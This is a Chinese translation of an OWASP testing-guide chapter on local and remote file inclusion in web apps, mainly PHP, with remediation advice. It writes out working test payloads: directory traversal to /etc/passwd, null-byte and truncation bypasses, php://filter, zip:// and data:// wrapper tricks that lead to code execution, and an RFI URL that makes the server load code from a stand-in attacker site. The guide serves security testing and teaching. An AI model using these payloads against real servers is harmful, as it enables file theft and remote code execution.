# 文件包含测试

## 概述

文件包含漏洞允许攻击者包含文件，通常利用目标应用程序中实现的“动态文件包含”机制。该漏洞是由于使用了未经过适当验证的用户提供输入而导致的。

这可能导致简单的文件内容输出，但也可能导致：

- 在 Web 服务器上执行代码
- 在客户端（例如 JavaScript）上执行代码，这可能引发其他攻击，例如跨站脚本攻击（XSS）
- 拒绝服务（DoS）
- 敏感信息泄露

本地文件包含（LFI）是指通过利用应用程序中存在的易受攻击的文件包含过程，将服务器上已存在的文件包含进来的过程。例如，当页面接收的输入是本地文件路径且该输入未经适当清理，允许注入目录遍历字符（如`../`——参见 4.5.1 [测试目录遍历文件包含/WSTG](../05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md)）时，就会出现此漏洞。

远程文件包含（RFI）是指通过利用应用程序中存在的易受攻击的文件包含过程，从远程源包含文件的过程。例如，当页面接收的输入是远程文件的 URL 且该输入未经适当清理，允许注入外部 URL 时，就会出现此漏洞。

在这两种情况下，尽管大多数示例指向易受攻击的 PHP 脚本，但我们应注意其在其他技术（如 JSP、ASP 等）中也很常见。

## 测试目标

-   识别文件包含注入点。
-   评估漏洞的严重性或潜在影响。

## 测试方法

### 本地文件包含测试

由于 LFI 发生在传递给 `include` 语句的路径未经适当清理时，在黑盒测试方法中，我们应查找接受文件名/路径作为参数的功能点。

考虑以下示例：

`https://vulnerable_host/preview.php?file=example.html`

这看起来是一个尝试 LFI 的有希望的位置。如果应用程序未选择 `file` 参数中给定的相应页面，而是直接包含输入内容，则可能包含服务器上的任意文件。

一个典型的概念验证利用是尝试加载 `passwd` 文件：

`https://vulnerable_host/preview.php?file=../../../../etc/passwd`

若满足上述条件，攻击者将在响应中看到类似以下内容被包含：

```text
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
alex:x:500:500:alex:/home/alex:/bin/bash
margo:x:501:501::/home/margo:/bin/bash
...
```

即使存在此类漏洞，其在真实场景中的利用可能更为复杂。考虑以下代码片段：

```php
<?php include($_GET['file'].".php"); ?>
```

简单地替换为随机文件名将无效，因为后缀 `.php` 会被附加到提供的输入之后。为绕过此限制，测试人员可使用多种技术实现预期利用

#### 空字节注入

`null character`（也称为`空终止符`或`空字节`）是一种值为零的控制字符，存在于许多字符集中，用作标记字符串结尾的保留字符。一旦使用该字符，此特殊字节后的任何字符都将被忽略。通常注入此字符的方法是在请求路径后附加URL编码字符串`%00`。在我们之前的示例中，向`https://vulnerable_host/preview.php?file=../../../../etc/passwd%00`发起请求将忽略添加到输入文件名后的`.php`扩展名，从而在成功利用后向攻击者返回基本用户列表。

#### 路径与点截断

大多数PHP安装版本的文件名长度限制为4096字节。如果任何给定文件名超过该长度，PHP会直接截断它，丢弃任何额外字符。利用此特性，可以通过将`.php`扩展名移出4096字节限制之外，使PHP引擎忽略该扩展名。当发生这种情况时，不会触发错误；额外字符会被直接丢弃，PHP继续正常执行。

这种绕过方法通常与其他逻辑绕过策略结合使用，例如使用Unicode编码对部分文件路径进行编码、引入双重编码或任何其他仍能表示有效所需文件名的输入方式。

#### PHP包装器

本地文件包含(LFI)漏洞通常被视为只读漏洞，攻击者可利用其从存在漏洞的应用程序服务器读取敏感数据。然而在特定实现中，此漏洞可升级为[从LFI到远程代码执行(RCE)](https://www.corben.io/zip-to-rce-lfi/)的漏洞，可能导致主机完全沦陷。

当攻击者能够[将LFI漏洞与某些PHP包装器结合利用](https://www.netsparker.com/blog/web-security/php-stream-wrappers/)时，这种攻击增强手段尤为常见。

包装器是围绕其他代码以提供附加功能的代码层。PHP实现了许多[内置包装器](https://www.php.net/manual/en/wrappers.php)用于文件系统函数。在应用测试过程中检测到包装器使用时，应尝试滥用该特性以评估已发现弱点的真实风险。以下列出最常用的包装器（非完整清单），同时需注意目标系统可能注册了自定义包装器，若存在此情况则需进行深度专项分析。

##### PHP过滤器

用于访问本地文件系统，此大小写不敏感的包装器可在打开文件时对数据流应用过滤器。该包装器能读取文件内容并阻止服务器执行文件，例如允许攻击者读取PHP文件源码以获取凭证等敏感信息或其他可被利用的漏洞。

该包装器用法示例：`php://filter/convert.base64-encode/resource=文件`，其中"文件"指待读取的目标文件。此操作将读取目标文件内容，进行Base64编码（此步骤可阻止服务器端执行），最终返回至用户代理。

##### PHP ZIP包装器

自PHP 7.2.0起引入`zip://`包装器用于操作ZIP压缩文件。该包装器参数结构为：`zip:///文件路径#压缩包内文件路径`。其中`文件路径`指向恶意ZIP压缩包，`压缩包内文件路径`指向该ZIP内的恶意文件。漏洞利用时通常需将`#`编码为URL编码值`%23`。

滥用此包装器可使攻击者精心构造恶意ZIP文件（例如伪装成头像图片），通过目标站点的任意文件上传功能（`php:zip://`包装器不要求ZIP文件具有特定扩展名）上传至服务器，最终通过LFI漏洞触发执行。

测试此漏洞可遵循以下步骤攻击前文示例代码：
1.  创建待执行的PHP文件（如内容`<?php phpinfo(); ?>`），保存为`code.php`
2.  将其压缩为名为`target.zip`的ZIP文件
3.  重命名`target.zip`为`target.jpg`绕过扩展名验证，作为头像上传至目标网站
4.  假设服务器将`target.jpg`存储在`../avatar/target.jpg`路径，通过向漏洞URL注入载荷执行攻击：  
    `zip://../avatar/target.jpg%23code`  
    （注意：`%23`对应`#`符号）

由于示例中会自动拼接`.php`扩展名，请求  
`https://vulnerable_host/preview.php?file=zip://../avatar/target.jpg%23code`  
将执行恶意ZIP文件内的`code.php`。

##### PHP Data包装器

自PHP 5.2.0起可用，此包装器的使用格式为：`data://text/plain;base64,BASE64编码字符串`，其中`BASE64编码字符串`应为待处理文件的Base64编码内容。需注意此包装器仅在`allow_url_include`选项启用时可用。

测试利用此包装器的LFI漏洞时，待执行代码需进行Base64编码。例如：  
`<?php phpinfo(); ?>` 编码后为：`PD9waHAgcGhwaW5mbygpOyA/Pg==`  
完整载荷示例：`data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==`

##### PHP Expect包装器

此包装器默认未启用，可访问进程的`stdio`、`stdout`和`stderr`。使用格式`expect://命令`时，服务器将通过`BASH`执行指定命令并返回结果。

### 远程文件包含测试

由于 RFI 发生在传递给 `include` 语句的 URL 未经适当清理时，在黑盒测试方法中，我们应查找以文件名作为参数的脚本。考虑以下 PHP 示例：

```php
$incfile = $_REQUEST["file"];
include($incfile.".php");
```

在此示例中，路径从 HTTP 请求中提取且未进行输入验证（例如，通过将输入与允许列表进行比对），因此此代码片段易受此类攻击。考虑以下 URL：

`https://vulnerable_host/vuln_page.php?file=https://attacker_site/malicous_page`

此种情况下，远程文件将被包含，其中包含的任何代码都将在服务器上执行。

## 修复方案

消除文件包含漏洞最有效的解决方案是避免将用户提交的输入传递给任何文件系统/框架 API。若无法避免，应用程序可维护一个页面允许包含的文件允许列表，然后使用标识符（例如索引号）访问所选文件。任何包含无效标识符的请求均应被拒绝，从而杜绝恶意用户操纵路径的可能性。
有关此主题的良好安全实践，请参阅 [文件上传备忘单](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)。

## Tools

- [kadimus](https://github.com/P0cL4bs/Kadimus)
- [LFI Suite](https://github.com/D35m0nd142/LFISuite)
- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org)

## References

- [WSTG-INPV-11-01](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion.md)
- [Wikipedia](https://www.wikipedia.org/wiki/Local_File_Inclusion)
- [Null character](https://en.wikipedia.org/wiki/Null_character)
- [Unicode Encoding](https://owasp.org/www-community/attacks/Unicode_Encoding)
- [Double Encoding](https://owasp.org/www-community/Double_Encoding)
- [PHP Supported Protocols and Wrappers](https://www.php.net/manual/en/wrappers.php)
- [RFC 2397 - The "data" URL scheme](https://www.rfc-editor.org/rfc/rfc2397)
- [Wikipedia: "Remote File Inclusion"](https://en.wikipedia.org/wiki/Remote_File_Inclusion)